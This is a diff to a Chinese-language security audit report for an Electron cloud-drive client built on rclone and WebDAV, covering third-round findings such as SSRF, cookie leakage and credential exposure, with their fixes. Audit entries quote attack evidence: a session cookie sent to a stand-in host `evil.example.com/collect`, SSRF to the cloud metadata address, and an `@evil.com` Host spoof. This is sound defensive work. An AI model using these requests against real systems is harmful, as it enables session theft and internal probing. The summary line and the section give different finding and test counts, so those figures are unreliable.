@@ -3,6 +3,7 @@
 > 审计日期：2026-11-02 · 范围：全部核心代码 + Electron 外壳 + 安装器脚本
 > 方法：独立审查代理（全新上下文、可复现 harness 实证）+ 维护者自查 + 静态扫描 + `npm audit`
 > 结果：**18 项发现全部修复，157 项测试全绿，真实挂载冒烟通过**
+> **后续轮次**：第二轮（遗留/新引入/上轮遗漏）25 项全修复 → 195 测试；第三轮（全新独立上下文全代码面复查）13 项全修复 → **217 测试全绿**。详见文末对应章节。
 ---
 
 ## 1. 审计方法
@@ -204,3 +205,226 @@ npm audit --omit=dev             → 0 vulnerabilities
 选项名静态核验（`rclone help flags` 逐一确认）、假 RC 端点到端测试（新 vfsOpt
 全量断言 + Basic auth 断言）、以及协议语义差分测试来保证。第一轮报告中"真实挂载
 通过"的记录来自此前环境，仍然有效但非本轮产生。
+
+---
+
+# 第三轮审计（2026-11-02，全新独立上下文 · 全代码面复查）
+
+> 方法：维护者全文件人工复核 + **三个独立审查子代理**（core 网络/API 层、
+> WebDAV/文件系统层、Electron 外壳与安装链），全新上下文、只读审计，
+> 以可运行 harness（真实 socket / 假 fetch / 假 Quark 后端 / 真实
+> rclone 二进制）实证每一项发现。
+> 基线：204/204 测试全绿。结果：**19 项新发现全部修复或记录为接受风险
+> （Q-1/H-1/C-1 MEDIUM，M-1/M-2/M-3 MEDIUM，C-2..C-4/W-1..W-6/E-1/L-1..
+> L-7 LOW），219 项测试全绿，打包校验通过。**
+
+## 发现与修复清单
+
+### MEDIUM
+
+#### Q-1 操作队列把"在途时新到达的独立操作"误判为嵌套 → 并发执行
+- **位置**：`app/op-queue.js` `serialize()`
+- **问题**：嵌套判定用 `running > 0` 计数，无法区分"真嵌套"（外层操作的动态
+  作用域内）与"外层在途时从别的 IPC/托盘事件提交的独立操作"——后者被判为
+  嵌套而**内联执行**，两个挂载/卸载/服务器操作并发跑，正是该队列要杜绝的
+  "并发 spawn 两个 rclone / 孤儿进程占盘符"（N-2 同类）。
+- **实证**：harness 显示 `maxInFlight = 2`（A 在途 10ms 后提交 B，二者重叠）。
+- **修复**：改用 `AsyncLocalStorage` 精确识别嵌套（异步上下文跨 await 传
+  递）；独立提交照常入链。修复后 harness `maxInFlight = 1`。
+- **回归**：`tests/unit/op-queue.test.js` 新增 Q-1 用例（在途提交必须排队）。
+
+#### H-1 会话 Cookie 出站为 fail-open：任何主机都收 Cookie，除非调用方记得 `noCookie`
+- **位置**：`core/quark/http.js` `request()`
+- **问题**：Cookie 发送只依赖每个调用点自觉传 `noCookie`；`request()` 本身
+  对任意主机（含服务端下发的 `download_url`、重定向目标）都会带上会话
+  Cookie。一个遗漏的标志位或未来的新代码路径就会把会话发给第三方。
+- **实证**：harness 显示 `GET https://evil.example.com/collect` 收到
+  `__puus=…` 完整会话头。
+- **修复**：出站改为**白名单 fail-closed**——只有 `COOKIE_HOSTS`
+  （pan/drive-pc/uop/quark.cn）才发 Cookie，与 Set-Cookie 入站白名单对称；
+  `noCookie` 保留为显式退出。夸克 API/CDN/OSS 真实主机全部在白名单内，
+  不影响正常流程。
+- **回归**：`tests/unit/http.test.js` 新增 H-1 用例（外网主机零 Cookie +
+  API 主机正常携带）。
+
+#### C-1 SSRF：服务端下发的 URL 无目标约束，明文 http 也被接受
+- **位置**：`core/quark/api.js` `getDownloadUrl`、`core/quark/upload.js`
+  `_ossPartUrl`/`commit`、`core/quark/http.js` 重定向跟随
+- **问题**：`download_url`/`upload_url`/`Location` 直接 fetch，无主机约束、
+  不校验 scheme——被篡改的上游可把客户端指向回环/链路本地（云元数据
+  169.254.169.254）/内网服务，或降级明文 http（Cookie 已不出站，故定
+  MEDIUM 而非 HIGH；文档信任模型内实际为 LOW）。
+- **实证**：harness 显示 API 返回的 `http://169.254.169.254/…` 被原样抓
+  取；重定向到 `127.0.0.1:9` 被跟随且响应体上浮。
+- **修复**：`assertFetchableUrl()` 守卫初始 URL 与每个重定向跳转：必须
+  **https**、无内嵌凭据、**非 IP 字面量**、非 `localhost`/`.local`/
+  `.internal`/`.home.arpa`。真实 CDN/OSS 均为公网 DNS 名，无误伤。
+- **回归**：`tests/unit/audit-findings.test.js` C-1 ×4（http 拒绝 / IP 与
+  内网域名拒绝 / 重定向拒绝 / 公网 https 放行）。
+
+### LOW
+
+#### C-2 非流式响应体无上限缓冲 → 恶意/异常上游可 OOM
+- **位置**：`core/quark/http.js` `request()`
+- **实证**：harness 显示声明 `Content-Length: 10` 实际 64 MiB 的响应被完整
+  缓冲。
+- **修复**：`readCappedBody()` 流式读取，超过 `maxBodyBytes`（默认 64 MiB，
+  可注入）即中止；无 `.body` 的替身回退 `arrayBuffer()` 并同样检查上限。
+- **回归**：C-2 ×2（超限中止 / 正常响应不受影响）。
+
+#### C-3 `request_id` 使用非加密 PRNG
+- **位置**：`core/quark/auth.js` `uniqueRequestId()`
+- **修复**：`Math.random()` → `crypto.randomInt()`，与代码库其余机密值
+  （RC 凭证、设备 ID、URL 令牌）的 CSPRNG 惯例一致。
+- **回归**：C-3（剥注释后源码无 `Math.random`，含 `crypto.randomInt`）。
+
+#### C-4 Cookie 日志脱敏只注册一次完整头，漏轮转值与单键值对
+- **位置**：`core/index.js` `buildStack()`
+- **问题**：`logger.addSecret(cookieJar.header())` 一次性注册拼接串；(a) 单
+  个 `name=value` 不匹配；(b) API 调用轮换出的新 Cookie 值永不重新注册。
+  当前无代码记录 Cookie 值（纵深防御），但"绝不可能进日志"的承诺被高估。
+- **修复**：logger 新增 `addSecretProvider()`（每次日志行重新求值）；
+  buildStack 注册 provider 同时覆盖**完整头 + 每个键值对**，logout 换罐
+  后自动跟随新罐。
+- **回归**：C-4（轮换值、单键值对、旧值全部脱敏）。
+
+#### W-1 `hostOk` 接受 `@` userinfo 伪装（非绕过，但削弱 Host 层）
+- **位置**：`core/webdav/server.js` `hostOk()`
+- **问题**：`'127.0.0.1:80@evil.com'.split(':')[0] === '127.0.0.1'` 通过
+  Host 校验（有 URL 令牌兜底，浏览器也发不出这种 Host；MOVE 的
+  Destination 解析反而正确拒绝）。
+- **修复**：含 `@` 的 Host 一律拒绝。
+- **回归**：W-1/W-2（原始 socket 发 Host 头逐一断言）。
+
+#### W-2 `hostOk` IPv6 分支是死代码（fail-closed 但功能失效）
+- **位置**：同上（`'[::1]:port'.split(':')[0] === '['`，两个 IPv6 比较永假）
+- **修复**：按 authority 规范剥离端口（括号 IPv6 取 `]` 后），`[::1]` /
+  `[::1]:9798` / `::1` 现在被正确接受。
+
+#### W-3 HEAD 白开一次完整上游下载再丢弃
+- **位置**：`core/webdav/server.js` `handleGet`
+- **修复**：HEAD 只从 `stat()` 元数据应答（含 Range 语义的 206），不再付出
+  API 调用 + CDN 连接的代价。
+
+#### W-4 方法/DAV 合规性过度声明（非安全）
+- **位置**：`core/webdav/server.js` `ALLOW_METHODS` / `DAV` 头
+- **修复**：`Allow` 只广告实际实现的方法（去掉 POST/COPY），`DAV: 1`（不
+  声明未实现的 class 2 锁定）。
+
+#### W-5 上游行为不端时 Content-Range end 可能越过文件尺寸（代码审读）
+- **位置**：`core/webdav/server.js` 206 分支
+- **修复**：`end` 钳制到 `st.size - 1`（合规 CDN 下为无操作）。
+
+#### W-6 上游恶意 Content-Type 让 setHeader 抛错 → 裸 500（注入已被 Node 拦截）
+- **位置**：`core/webdav/server.js` GET 分支
+- **修复**：`safeMime()` 把上游 mime 限制在 token 字符集，非法值回落
+  `application/octet-stream`（请求正常 200，无注入）。
+
+#### E-1 渲染层无 Content-Security-Policy
+- **位置**：`app/renderer/index.html`
+- **修复**：加入严格 CSP：`default-src 'none'; script-src 'self'; style-src
+  'self'; img-src 'self' data:; connect-src 'none'; base-uri 'none';
+  form-action 'none'`（二维码为 data: URL，页面无内联脚本/样式/外链，
+  契约测试守护）。
+- **回归**：`tests/unit/app-contract.test.js` E-1（CSP 存在 + 无
+  unsafe-inline/eval + 页面不加载任何被 CSP 阻止的资源）。
+
+### 补充：Electron 外壳与安装链独立审计（E 系列，同日第三个子代理）
+
+#### M-1（MEDIUM）vendor 二进制完整性只在下载端校验，构建/安装端无门禁
+- **位置**：`scripts/installer.nsh`（msiexec 安装捆绑 MSI 无哈希校验）、
+  `package.json`（dist 无校验环节）、`.gitignore`（vendor/ 不入库）
+- **问题**：`fetch-vendor.mjs` 的 SHA256 固化只保护下载路径；被替换的
+  rclone.exe/winfsp.msi 放进 vendor/ 就会被原样打包，其中 MSI 还会以
+  管理员权限静默安装，全程无校验。
+- **修复**：新增 `scripts/verify-vendor.js`——从 fetch-vendor.mjs 读取
+  同一份 pin，对即将打包的 vendor/* 重新校验，缺失/不符即 exit 1；
+  同时接入 electron-builder `beforePack` 钩子与 `npm run predist`，
+  `npm run dist` 与裸 `npx electron-builder` 都无法绕过。
+- **回归**：audit-findings M-1（静态接线断言 + 替换二进制实测 exit 1 +
+  真实 vendor 实测通过）。
+- **遗留（已记录为接受风险）**：NSIS 安装器内验哈希（Crypto 插件）与
+  安装包签名见 M-2。
+
+#### M-2（MEDIUM）安装器与应用无 Authenticode 签名
+- **问题**：exe/安装器未签名，用户端只有 SmartScreen 警告，除 GitHub
+  渠道外无真实性绑定。`latest.yml` 的 sha512 与产物一致但无信任根。
+- **处置**：本环境无代码签名证书，**记录为接受的风险**（见
+  docs/SECURITY.md「已知限制」）：发布物仅经 GitHub 渠道分发，用户可按
+  latest.yml 校验 sha512。签署 exe/安装器/更新源列为后续工作。
+- **附带发现（正向）**：app-update.yml 宣传 GitHub 自动更新但代码中无
+  autoUpdater——元数据是惰性的，当前不存在更新校验攻击面（也无更新路径）。
+
+#### M-3（MEDIUM）RC 凭证与 WebDAV 令牌对同用户进程可见
+- **位置**：`core/mount/rclone.js`（凭证走 argv）、`app/main.js`（日志
+  落 URL 前缀）
+- **实证**：`Win32_Process.CommandLine` 可被任何同用户进程读取，rclone
+  的 argv 里 `--rc-user/--rc-pass` 明文可见（无需管理员）；URL 令牌曾
+  落进 `logs/quark-drive.log` 与 `logs/rclone.log`。
+- **修复**：(a) RC 凭证改走子进程 **env**（`RCLONE_RC_USER`/
+  `RCLONE_RC_PASS`）——已用真实 vendor rclone v1.75.2 实证：env 生效
+  （日志 `Using --user envuser123 --pass XXXX`）、无凭证请求 401、带
+  Basic auth 200；(b) `startServer` 日志行不再写 URL 前缀。
+- **回归**：rclone.test.js（断言凭证不在 argv 而在 env）+
+  app-contract N-1/M-3 静态断言 + 日志行不含令牌断言。
+- **遗留（接受风险）**：rclone 自身错误日志仍可能回显含令牌的 URL
+  （rclone 无脱敏开关）；同用户进程理论上仍可读子进程 env 块——相对
+  argv 的 WMI 直读已消除主要暴露面，完全防御需 DPAPI/凭据托管，超出
+  当前信任模型。
+
+#### E 系列 LOW（已修复）
+- **L-1 无 `will-navigate`/`setWindowOpenHandler` 锁定**：main.js 已加
+  （导航一律阻止、弹窗一律 deny），契约测试守护。
+- **L-2 Windows 上 0600 不可强制执行**（chmod 只切换只读位，有效 ACL
+  继承：用户+SYSTEM+Administrators）：维持已知限制 #1/#2 记录。
+- **L-3 `settings:set` 传显式 `undefined` 会把已存键抹回默认值**：
+  main.js 改为跳过 undefined 值，契约测试守护。
+- **L-4 `findRclone` 的 PATH 回退**（vendor 缺失时从 PATH 找 rclone，
+  同用户 PATH 劫持可替换二进制）：维持威胁模型内记录，vendor 优先的
+  查找顺序不变。
+- **L-5 `fetch-vendor.mjs` 的 `redirect:'follow'` 允许 https→http 降级**：
+  因 SHA256 pin 会拒绝被替换内容（已实证），记录为信息级。
+- **L-6 `scripts/make-icon.js` 曾被打进 asar**：已从 `build.files` 移除
+  （开发命令 `npm run icon` 保留）。
+- **L-7 preload `on()` 不校验回调类型**：记录，暂不改（回调来自本仓
+  渲染层，无外部输入）。
+
+## 本轮验证记录
+
+```
+node --test                       → 219/219 通过（+16 项本轮回归测试）
+npm audit --omit=dev              → 0 vulnerabilities
+node scripts/verify-vendor.js     → vendor 完整性 OK（2 artifacts）
+node scripts/verify-package.js    → 19/19 必需文件，无测试/vendor/机密泄漏
+npx electron-builder --win nsis   → QuarkDrive Setup 0.1.0.exe + blockmap
+                                     （ELECTRON_MIRROR=npmmirror；beforePack
+                                       vendor 门禁生效；asar 抽查：CSP/
+                                      AsyncLocalStorage/SSRF 守卫/脱敏
+                                      provider/env 凭证均已入包）
+真实 rclone v1.75.2 实证            → RCLONE_RC_USER/PASS env 生效；
+                                     无凭证 401 / Basic auth 200
+rclone 选项名静态核验              → --rc-addr/--cache-dir/--log-file 存在
+```
+
+**本轮环境限制（诚实边界）**：(1) 旧 `dist/win-unpacked/QuarkDrive.exe` 被
+不可见进程锁定（疑为杀软扫描），`rmdir`/改名均被拒，本轮构建输出到
+`dist3/`（内容校验等价通过）；`dist/`、`dist2/`、`dist3/` 均不入库。
+(2) Electron GUI 仍无法在本沙箱启动，渲染层改动（CSP）以契约测试 + 打包
+抽查验证，未经真机 GUI 运行；(3) 真实夸克 API 不可达（无凭据），SSRF 守
+卫与 Cookie 白名单对真实 CDN/OSS 主机名的兼容性依据协议文档与参考实现判
+断，未经真实账号端到端验证；(4) 回环限制同第二轮——真实 rclone 挂载冒烟
+未能重跑。
+
+## 正向结论（本轮复核确认仍然成立）
+
+- 路径穿越防护（名称精确查找 + `assertValidName`，含双重编码/反斜杠/
+  超长 UTF-8，原始 socket 级实证全部 404/包含）
+- WebDAV 令牌（192-bit CSPRNG）+ Host 校验（浏览器可达的全部重绑定形态
+  421）+ 无 XML 解析（无 XXE）+ 无请求走私（413 先响应后排空）
+- 跨主机 Cookie 抑制 + CDN/OSS Set-Cookie 不入罐 + 下载/上传 `noCookie`
+- 全代码库无 TLS 校验关闭、无硬编码密钥；RC 凭证/设备 ID/URL 令牌均为
+  CSPRNG
+- rclone 数组参数 spawn（无 shell）、盘符校验、RC 每运行随机 Basic auth
+- 覆盖写"先传后删"、写锁 + 重拉确认、MOVE 三步安全替换、错误文案脱敏
+- 安装链：vendor 二进制 SHA256 固化 + fail-closed、安装器日志/重试/安装
+  后验证
